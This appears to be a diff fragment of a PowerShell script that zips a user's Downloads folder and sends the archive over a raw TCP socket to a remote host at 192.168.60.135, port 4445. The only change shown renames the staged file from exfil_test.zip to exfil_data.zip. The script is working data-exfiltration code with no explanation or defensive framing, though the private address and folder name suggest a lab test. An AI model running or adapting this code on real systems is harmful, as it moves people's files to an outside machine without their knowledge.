@@ -6,7 +6,7 @@ Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath
 
 $client = New-Object System.Net.Sockets.TCPClient("192.168.60.135", 4445)
 $stream = $client.GetStream()
-$bytes  = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\exfil_test.zip")
+$bytes  = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\exfil_data.zip")
 $stream.Write($bytes, 0, $bytes.Length)
 $stream.Close()
 $client.Close()
